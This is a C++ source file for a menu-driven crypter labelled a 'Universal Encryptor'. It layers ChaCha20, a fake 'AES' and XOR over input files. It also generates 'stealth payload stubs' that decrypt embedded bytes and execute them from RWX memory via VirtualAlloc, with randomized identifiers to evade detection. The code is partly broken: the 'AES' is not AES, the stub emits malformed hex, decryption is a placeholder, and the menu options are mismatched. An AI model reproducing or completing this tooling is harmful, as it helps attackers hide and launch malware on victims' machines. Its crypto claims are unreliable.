#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#else
#include <unistd.h>
#include <sys/time.h>
#endif

class VS2022MenuEncryptor {
private:
    std::mt19937_64 rng;
    
    struct TripleKey {
        std::vector<uint8_t> chacha_key;
        std::vector<uint8_t> chacha_nonce;
        std::vector<uint8_t> aes_key;
        std::vector<uint8_t> xor_key;
        uint32_t encryption_order;
    };

    // Enhanced entropy gathering
    std::vector<uint64_t> gatherEntropy() {
        std::vector<uint64_t> entropy;
        
#ifdef _WIN32
        LARGE_INTEGER perf_counter;
        QueryPerformanceCounter(&perf_counter);
        entropy.push_back(perf_counter.QuadPart);
        
        HCRYPTPROV hProv;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            uint64_t random_val;
            if (CryptGenRandom(hProv, sizeof(random_val), (BYTE*)&random_val)) {
                entropy.push_back(random_val);
            }
            CryptReleaseContext(hProv, 0);
        }
#else
        struct timeval tv;
        gettimeofday(&tv, nullptr);
        entropy.push_back(tv.tv_sec * 1000000 + tv.tv_usec);
        entropy.push_back(getpid());
#endif
        
        auto now = std::chrono::high_resolution_clock::now();
        entropy.push_back(now.time_since_epoch().count());
        entropy.push_back(reinterpret_cast<uint64_t>(&entropy));
        
        return entropy;
    }

    // ChaCha20 implementation
    void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = (d << 16) | (d >> 16);
        c += d; b ^= c; b = (b << 12) | (b >> 20);
        a += b; d ^= a; d = (d << 8) | (d >> 24);
        c += d; b ^= c; b = (b << 7) | (b >> 25);
    }

    void chachaBlock(uint32_t out[16], const uint32_t in[16]) {
        for (int i = 0; i < 16; i++) out[i] = in[i];
        
        for (int i = 0; i < 10; i++) {
            quarterRound(out[0], out[4], out[8], out[12]);
            quarterRound(out[1], out[5], out[9], out[13]);
            quarterRound(out[2], out[6], out[10], out[14]);
            quarterRound(out[3], out[7], out[11], out[15]);
            
            quarterRound(out[0], out[5], out[10], out[15]);
            quarterRound(out[1], out[6], out[11], out[12]);
            quarterRound(out[2], out[7], out[8], out[13]);
            quarterRound(out[3], out[4], out[9], out[14]);
        }
        
        for (int i = 0; i < 16; i++) out[i] += in[i];
    }

    void initChachaState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12]) {
        const char* constants = "expand 32-byte k";
        memcpy(state, constants, 16);
        memcpy(state + 4, key, 32);
        state[12] = 0;
        memcpy(state + 13, nonce, 12);
    }

    void chacha20Crypt(std::vector<uint8_t>& data, const uint8_t key[32], const uint8_t nonce[12]) {
        uint32_t state[16];
        initChachaState(state, key, nonce);
        
        for (size_t i = 0; i < data.size(); i += 64) {
            uint32_t keystream[16];
            chachaBlock(keystream, state);
            
            uint8_t* ks_bytes = (uint8_t*)keystream;
            for (size_t j = 0; j < 64 && i + j < data.size(); j++) {
                data[i + j] ^= ks_bytes[j];
            }
            
            state[12]++;
        }
    }

    // AES S-box
    void aesStreamCrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
        static const uint8_t sbox[256] = {
            0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
            0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
            0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
            0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
            0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
            0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
            0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
            0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
            0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
            0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
            0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
            0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
            0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
            0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
            0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
            0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
        };
        
        for (size_t i = 0; i < data.size(); i++) {
            uint8_t keyByte = key[i % key.size()];
            uint8_t nonceByte = (i >> 8) ^ (i & 0xFF);
            uint8_t mixedKey = sbox[keyByte] ^ nonceByte;
            data[i] ^= mixedKey;
        }
    }

    // Enhanced XOR
    void xorCrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
        for (size_t i = 0; i < data.size(); i++) {
            uint8_t keyByte = key[i % key.size()];
            uint8_t posByte = (i * 0x9E3779B9) & 0xFF;
            data[i] ^= keyByte ^ posByte;
        }
    }

    TripleKey generateKeys() {
        TripleKey keys;
        auto entropy = gatherEntropy();
        
        std::seed_seq seed(entropy.begin(), entropy.end());
        rng.seed(seed);
        
        keys.chacha_key.resize(32);
        keys.chacha_nonce.resize(12);
        keys.aes_key.resize(32);
        keys.xor_key.resize(64);
        
        for (auto& k : keys.chacha_key) k = rng() & 0xFF;
        for (auto& n : keys.chacha_nonce) n = rng() & 0xFF;
        for (auto& k : keys.aes_key) k = rng() & 0xFF;
        for (auto& k : keys.xor_key) k = rng() & 0xFF;
        
        keys.encryption_order = rng() % 6;
        
        return keys;
    }

    std::string bytesToBigDecimal(const std::vector<uint8_t>& bytes) {
        std::vector<uint8_t> result = {0};
        
        for (uint8_t byte : bytes) {
            int carry = 0;
            for (int i = result.size() - 1; i >= 0; i--) {
                int prod = result[i] * 256 + carry;
                result[i] = prod % 10;
                carry = prod / 10;
            }
            while (carry > 0) {
                result.insert(result.begin(), carry % 10);
                carry /= 10;
            }
            
            carry = byte;
            for (int i = result.size() - 1; i >= 0 && carry > 0; i--) {
                int sum = result[i] + carry;
                result[i] = sum % 10;
                carry = sum / 10;
            }
            while (carry > 0) {
                result.insert(result.begin(), carry % 10);
                carry /= 10;
            }
        }
        
        std::string decimal;
        for (uint8_t digit : result) {
            decimal += ('0' + digit);
        }
        return decimal.empty() ? "0" : decimal;
    }

    std::string generateUniqueVarName() {
        const std::vector<std::string> prefixes = {"var", "data", "buf", "mem", "tmp", "obj", "ptr", "val", "cfg", "sys"};
        const std::vector<std::string> middles = {"Core", "Mgr", "Proc", "Ctrl", "Hdl", "Ref", "Ctx", "Buf", "Ops", "Util"};
        const std::vector<std::string> suffixes = {"Ex", "Ptr", "Obj", "Cfg", "Mgr", "Ctx", "Buf", "Ops", "Val", "Ref"};
        
        std::string name = prefixes[rng() % prefixes.size()];
        name += middles[rng() % middles.size()];
        name += suffixes[rng() % suffixes.size()];
        name += std::to_string(rng() % 10000);
        
        return name;
    }

public:
    VS2022MenuEncryptor() : rng(std::chrono::high_resolution_clock::now().time_since_epoch().count()) {}

    void showMenu() {
        std::cout << "\n=== Visual Studio 2022 Universal Encryptor ===" << std::endl;
        std::cout << "Advanced encryption tool with multiple algorithms and stealth features\n" << std::endl;
        
        std::cout << "Select an option:" << std::endl;
        std::cout << "  1. Basic Encryption (AES/ChaCha20)" << std::endl;
        std::cout << "  2. Basic Encryption - Raw Binary Output" << std::endl;
        std::cout << "  3. Stealth Triple Encryption" << std::endl;
        std::cout << "  4. Runtime-Only Encryption (No Disk Save)" << std::endl;
        std::cout << "  5. Generate Stealth Payload Stub" << std::endl;
        std::cout << "  6. Generate Encryptor Stub" << std::endl;
        std::cout << "  7. Generate XLL Stealth Payload Stub" << std::endl;
        std::cout << "  0. Exit" << std::endl;
        std::cout << "\nEnter your choice: ";
    }

    bool basicEncryption(bool rawOutput = false) {
        std::string inputFile, outputFile;
        int algorithm;
        
        std::cout << "Enter input file path: ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output file path: ";
        std::getline(std::cin, outputFile);
        
        std::cout << "Select algorithm:" << std::endl;
        std::cout << "  1. AES-128-CTR (default)" << std::endl;
        std::cout << "  2. ChaCha20" << std::endl;
        std::cout << "Enter choice (1-2): ";
        std::cin >> algorithm;
        std::cin.ignore();
        
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (data.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        // Generate keys
        TripleKey keys = generateKeys();
        
        // Apply encryption
        if (algorithm == 2) {
            chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
        } else {
            aesStreamCrypt(data, keys.aes_key);
        }
        
        // Write output
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        
        if (rawOutput) {
            // Raw binary output - just encrypted data
            outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        } else {
            // Standard output with headers
            uint8_t alg_id = (algorithm == 2) ? 0x02 : 0x01;
            outFile.write(reinterpret_cast<const char*>(&alg_id), 1);
            
            if (algorithm == 2) {
                outFile.write(reinterpret_cast<const char*>(keys.chacha_nonce.data()), 12);
            }
            
            outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        }
        
        outFile.close();
        
        // Save keys separately
        std::string keyFile = outputFile + ".keys";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "Algorithm: " << (algorithm == 2 ? "ChaCha20" : "AES") << std::endl;
            keyOut << "Key: ";
            for (uint8_t b : (algorithm == 2 ? keys.chacha_key : keys.aes_key)) {
                keyOut << std::hex << std::setw(2) << std::setfill('0') << (int)b;
            }
            keyOut << std::endl;
            
            if (algorithm == 2) {
                keyOut << "Nonce: ";
                for (uint8_t b : keys.chacha_nonce) {
                    keyOut << std::hex << std::setw(2) << std::setfill('0') << (int)b;
                }
                keyOut << std::endl;
            }
        }
        
        std::cout << "Encryption completed successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Keys saved: " << keyFile << std::endl;
        
        return true;
    }

    bool stealthTripleEncryption() {
        std::string inputFile, outputFile;
        
        std::cout << "Enter input file path: ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output file path: ";
        std::getline(std::cin, outputFile);
        
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (data.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        // Generate keys
        TripleKey keys = generateKeys();
        
        // Apply triple encryption in randomized order
        std::vector<int> order;
        switch (keys.encryption_order) {
            case 0: order = {0, 1, 2}; break; // ChaCha20, AES, XOR
            case 1: order = {0, 2, 1}; break; // ChaCha20, XOR, AES
            case 2: order = {1, 0, 2}; break; // AES, ChaCha20, XOR
            case 3: order = {1, 2, 0}; break; // AES, XOR, ChaCha20
            case 4: order = {2, 0, 1}; break; // XOR, ChaCha20, AES
            case 5: order = {2, 1, 0}; break; // XOR, AES, ChaCha20
        }
        
        for (int method : order) {
            switch (method) {
                case 0: chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data()); break;
                case 1: aesStreamCrypt(data, keys.aes_key); break;
                case 2: xorCrypt(data, keys.xor_key); break;
            }
        }
        
        // Write raw encrypted data
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        outFile.close();
        
        // Save keys as decimal strings
        std::string keyFile = outputFile + ".keys";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "# Stealth Triple Encryption Keys (Decimal Format)" << std::endl;
            keyOut << "ChaCha20Key=" << bytesToBigDecimal(keys.chacha_key) << std::endl;
            keyOut << "ChaCha20Nonce=" << bytesToBigDecimal(keys.chacha_nonce) << std::endl;
            keyOut << "AESKey=" << bytesToBigDecimal(keys.aes_key) << std::endl;
            keyOut << "XORKey=" << bytesToBigDecimal(keys.xor_key) << std::endl;
            keyOut << "EncryptionOrder=" << keys.encryption_order << std::endl;
        }
        
        std::cout << "Stealth triple encryption completed successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Keys saved: " << keyFile << " (decimal format)" << std::endl;
        
        return true;
    }

    bool runtimeOnlyEncryption() {
        std::string inputFile;
        int algorithm;
        
        std::cout << "=== Runtime-Only Encryption (No Disk Save) ===" << std::endl;
        std::cout << "File will be encrypted in memory only - no encrypted file saved to disk!\n" << std::endl;
        
        std::cout << "Enter input file path (e.g., C:\\Windows\\System32\\calc.exe): ";
        std::getline(std::cin, inputFile);
        
        std::cout << "Select algorithm:" << std::endl;
        std::cout << "  1. AES-128-CTR (fast)" << std::endl;
        std::cout << "  2. ChaCha20 (secure)" << std::endl;
        std::cout << "  3. Triple Encryption (maximum security)" << std::endl;
        std::cout << "Enter choice (1-3): ";
        std::cin >> algorithm;
        std::cin.ignore();
        
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> originalData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (originalData.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        // Make a copy for encryption (keep original intact)
        std::vector<uint8_t> encryptedData = originalData;
        
        // Generate keys
        TripleKey keys = generateKeys();
        
        std::cout << "\nOriginal file size: " << originalData.size() << " bytes" << std::endl;
        std::cout << "Encrypting in memory..." << std::endl;
        
        // Apply encryption based on choice
        switch (algorithm) {
            case 1: // AES
                aesStreamCrypt(encryptedData, keys.aes_key);
                std::cout << "✓ AES encryption applied" << std::endl;
                break;
                
            case 2: // ChaCha20
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                std::cout << "✓ ChaCha20 encryption applied" << std::endl;
                break;
                
            case 3: // Triple encryption
                {
                    std::vector<int> order;
                    switch (keys.encryption_order) {
                        case 0: order = {0, 1, 2}; break; // ChaCha20, AES, XOR
                        case 1: order = {0, 2, 1}; break; // ChaCha20, XOR, AES
                        case 2: order = {1, 0, 2}; break; // AES, ChaCha20, XOR
                        case 3: order = {1, 2, 0}; break; // AES, XOR, ChaCha20
                        case 4: order = {2, 0, 1}; break; // XOR, ChaCha20, AES
                        case 5: order = {2, 1, 0}; break; // XOR, AES, ChaCha20
                    }
                    
                    for (int method : order) {
                        switch (method) {
                            case 0: chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data()); break;
                            case 1: aesStreamCrypt(encryptedData, keys.aes_key); break;
                            case 2: xorCrypt(encryptedData, keys.xor_key); break;
                        }
                    }
                    std::cout << "✓ Triple encryption applied (order: " << keys.encryption_order << ")" << std::endl;
                }
                break;
                
            default:
                std::cout << "Invalid algorithm choice!" << std::endl;
                return false;
        }
        
        // Show encryption results (in memory only)
        std::cout << "\n=== Runtime Encryption Complete ===" << std::endl;
        std::cout << "✓ File encrypted successfully in memory" << std::endl;
        std::cout << "✓ Original file size: " << originalData.size() << " bytes" << std::endl;
        std::cout << "✓ Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "✓ Memory locations:" << std::endl;
        std::cout << "  - Original data: 0x" << std::hex << (uintptr_t)originalData.data() << std::endl;
        std::cout << "  - Encrypted data: 0x" << std::hex << (uintptr_t)encryptedData.data() << std::dec << std::endl;
        
        // Verify encryption worked by comparing first few bytes
        bool different = false;
        for (size_t i = 0; i < std::min(originalData.size(), (size_t)16); i++) {
            if (originalData[i] != encryptedData[i]) {
                different = true;
                break;
            }
        }
        
        if (different) {
            std::cout << "✓ Encryption verified - data has been transformed" << std::endl;
        } else {
            std::cout << "⚠ Warning: Encrypted data appears identical to original" << std::endl;
        }
        
        std::cout << "\n=== Runtime Status ===" << std::endl;
        std::cout << "• Original file: UNCHANGED on disk" << std::endl;
        std::cout << "• Encrypted data: EXISTS ONLY IN MEMORY" << std::endl;
        std::cout << "• Keys: GENERATED IN MEMORY (not saved)" << std::endl;
        std::cout << "• When program exits: ALL ENCRYPTED DATA DESTROYED" << std::endl;
        
        // Optional: Show first few bytes comparison
        std::cout << "\nFirst 8 bytes comparison:" << std::endl;
        std::cout << "Original:  ";
        for (size_t i = 0; i < std::min(originalData.size(), (size_t)8); i++) {
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)originalData[i] << " ";
        }
        std::cout << std::endl;
        std::cout << "Encrypted: ";
        for (size_t i = 0; i < std::min(encryptedData.size(), (size_t)8); i++) {
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)encryptedData[i] << " ";
        }
        std::cout << std::dec << std::endl;
        
        // Data automatically destroyed when function exits (vectors go out of scope)
        std::cout << "\nPress Enter to destroy encrypted data and return to menu...";
        std::cin.get();
        
        return true;
    }

    bool generateStealthPayloadStub() {
        std::string inputFile, outputFile;
        
        std::cout << "Enter payload file path: ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output C++ stub path: ";
        std::getline(std::cin, outputFile);
        
        // Read and encrypt payload
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open payload file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> payload((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (payload.empty()) {
            std::cout << "Error: Payload file is empty!" << std::endl;
            return false;
        }
        
        // Generate keys and encrypt payload
        TripleKey keys = generateKeys();
        
        std::vector<int> order;
        switch (keys.encryption_order) {
            case 0: order = {0, 1, 2}; break;
            case 1: order = {0, 2, 1}; break;
            case 2: order = {1, 0, 2}; break;
            case 3: order = {1, 2, 0}; break;
            case 4: order = {2, 0, 1}; break;
            case 5: order = {2, 1, 0}; break;
        }
        
        for (int method : order) {
            switch (method) {
                case 0: chacha20Crypt(payload, keys.chacha_key.data(), keys.chacha_nonce.data()); break;
                case 1: aesStreamCrypt(payload, keys.aes_key); break;
                case 2: xorCrypt(payload, keys.xor_key); break;
            }
        }
        
        // Generate unique names
        std::string payloadVar = generateUniqueVarName();
        std::string decryptFunc = generateUniqueVarName() + "Decrypt";
        std::string executeFunc = generateUniqueVarName() + "Execute";
        
        // Generate C++ stub
        std::string stub = R"(#include <iostream>
#include <vector>
#include <cstring>
#include <windows.h>

// Embedded encrypted payload
static const unsigned char )" + payloadVar + R"([] = {
)";
        
        // Add encrypted payload as hex bytes
        for (size_t i = 0; i < payload.size(); i++) {
            if (i % 16 == 0) stub += "    ";
            stub += "0x" + std::to_string(payload[i]) + ",";
            if (i % 16 == 15) stub += "\n";
        }
        
        stub += R"(
};
static const size_t payloadSize = )" + std::to_string(payload.size()) + R"(;

// Decryption keys (obfuscated as decimal strings)
static const std::string chachaKeyDec = ")" + bytesToBigDecimal(keys.chacha_key) + R"(";
static const std::string chachaNonceDec = ")" + bytesToBigDecimal(keys.chacha_nonce) + R"(";
static const std::string aesKeyDec = ")" + bytesToBigDecimal(keys.aes_key) + R"(";
static const std::string xorKeyDec = ")" + bytesToBigDecimal(keys.xor_key) + R"(";
static const int encOrder = )" + std::to_string(keys.encryption_order) + R"(;

// [Decryption functions would be here - ChaCha20, AES, XOR implementations]

bool )" + decryptFunc + R"((std::vector<unsigned char>& data) {
    // Implement decryption logic here
    // This is a placeholder - full implementation would include all crypto functions
    return true;
}

bool )" + executeFunc + R"((const std::vector<unsigned char>& decrypted) {
    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, decrypted.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return false;
    
    // Copy decrypted payload
    memcpy(execMem, decrypted.data(), decrypted.size());
    
    // Execute payload
    ((void(*)())execMem)();
    
    return true;
}

int main() {
    std::vector<unsigned char> payload()" + payloadVar + R"(, )" + payloadVar + R"( + payloadSize);
    
    if ()" + decryptFunc + R"((payload)) {
        )" + executeFunc + R"((payload);
    }
    
    return 0;
}
)";
        
        // Write stub to file
        std::ofstream stubFile(outputFile);
        if (!stubFile) {
            std::cout << "Error: Cannot create stub file!" << std::endl;
            return false;
        }
        
        stubFile << stub;
        stubFile.close();
        
        std::cout << "Stealth payload stub generated successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Compile with: g++ -o payload.exe " << outputFile << std::endl;
        
        return true;
    }

    bool generateEncryptorStub() {
        std::string outputFile;
        
        std::cout << "Enter output C++ encryptor stub path: ";
        std::getline(std::cin, outputFile);
        
        // Generate unique names
        std::string mainFunc = generateUniqueVarName() + "Encryptor";
        std::string keyVar = generateUniqueVarName() + "Keys";
        
        std::string stub = R"(#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <random>
#include <chrono>

// Triple encryption implementation
class )" + mainFunc + R"( {
private:
    struct )" + keyVar + R"( {
        std::vector<uint8_t> chacha_key;
        std::vector<uint8_t> chacha_nonce;
        std::vector<uint8_t> aes_key;
        std::vector<uint8_t> xor_key;
        uint32_t encryption_order;
    };
    
    // [Full ChaCha20, AES, XOR implementations would be here]
    
public:
    bool encryptFile(const std::string& inputFile, const std::string& outputFile) {
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (data.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        // Generate random keys
        )" + keyVar + R"( keys = generateKeys();
        
        // Apply triple encryption
        applyTripleEncryption(data, keys);
        
        // Write encrypted file
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        outFile.close();
        
        // Save keys
        std::string keyFile = outputFile + ".keys";
        saveKeys(keys, keyFile);
        
        std::cout << "File encrypted successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Keys: " << keyFile << std::endl;
        
        return true;
    }
    
private:
    )" + keyVar + R"( generateKeys() {
        // Generate random encryption keys
        )" + keyVar + R"( keys;
        std::mt19937_64 rng(std::chrono::high_resolution_clock::now().time_since_epoch().count());
        
        keys.chacha_key.resize(32);
        keys.chacha_nonce.resize(12);
        keys.aes_key.resize(32);
        keys.xor_key.resize(64);
        
        for (auto& k : keys.chacha_key) k = rng() & 0xFF;
        for (auto& n : keys.chacha_nonce) n = rng() & 0xFF;
        for (auto& k : keys.aes_key) k = rng() & 0xFF;
        for (auto& k : keys.xor_key) k = rng() & 0xFF;
        
        keys.encryption_order = rng() % 6;
        
        return keys;
    }
    
    void applyTripleEncryption(std::vector<uint8_t>& data, const )" + keyVar + R"(& keys) {
        // Apply ChaCha20 + AES + XOR in randomized order
        // [Implementation would be here]
    }
    
    void saveKeys(const )" + keyVar + R"(& keys, const std::string& filename) {
        std::ofstream keyFile(filename);
        if (keyFile) {
            keyFile << "# Triple Encryption Keys" << std::endl;
            // Save keys in decimal format for obfuscation
            keyFile << "Order=" << keys.encryption_order << std::endl;
        }
    }
};

int main(int argc, char* argv[]) {
    std::cout << "=== Universal File Encryptor Stub ===" << std::endl;
    
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <input_file> <output_file>" << std::endl;
        std::cout << "Supports: XLL, EXE, DLL, PDF, any file type" << std::endl;
        return 1;
    }
    
    )" + mainFunc + R"( encryptor;
    
    if (encryptor.encryptFile(argv[1], argv[2])) {
        std::cout << "Encryption completed successfully!" << std::endl;
        return 0;
    } else {
        std::cout << "Encryption failed!" << std::endl;
        return 1;
    }
}
)";
        
        // Write stub to file
        std::ofstream stubFile(outputFile);
        if (!stubFile) {
            std::cout << "Error: Cannot create encryptor stub file!" << std::endl;
            return false;
        }
        
        stubFile << stub;
        stubFile.close();
        
        std::cout << "Encryptor stub generated successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Compile with: g++ -std=c++17 -O2 -o encryptor.exe " << outputFile << std::endl;
        std::cout << "Usage: ./encryptor.exe file.xll encrypted_file.bin" << std::endl;
        
        return true;
    }

    bool generateXLLStealthStub() {
        std::string inputFile, outputFile;
        
        std::cout << "Enter XLL payload file path: ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output C++ XLL stub path: ";
        std::getline(std::cin, outputFile);
        
        std::cout << "XLL stealth payload stub generation - Coming Soon!" << std::endl;
        std::cout << "This will create XLL-specific payload stubs with:" << std::endl;
        std::cout << "- XLL loading capabilities" << std::endl;
        std::cout << "- Excel integration functions" << std::endl;
        std::cout << "- Stealth execution methods" << std::endl;
        
        return true;
    }

    void run() {
        int choice;
        
        do {
            showMenu();
            std::cin >> choice;
            std::cin.ignore(); // Clear input buffer
            
            std::cout << std::endl;
            
            switch (choice) {
                case 1:
                    basicEncryption(false);
                    break;
                case 2:
                    basicEncryption(true);
                    break;
                case 3:
                    stealthTripleEncryption();
                    break;
                case 4:
                    generateStealthPayloadStub();
                    break;
                case 5:
                    generateEncryptorStub();
                    break;
                case 6:
                    generateXLLStealthStub();
                    break;
                case 0:
                    std::cout << "Goodbye!" << std::endl;
                    break;
                default:
                    std::cout << "Invalid choice! Please try again." << std::endl;
            }
            
            if (choice != 0) {
                std::cout << "\nPress Enter to continue...";
                std::cin.get();
            }
            
        } while (choice != 0);
    }
};

int main() {
    VS2022MenuEncryptor encryptor;
    encryptor.run();
    return 0;
}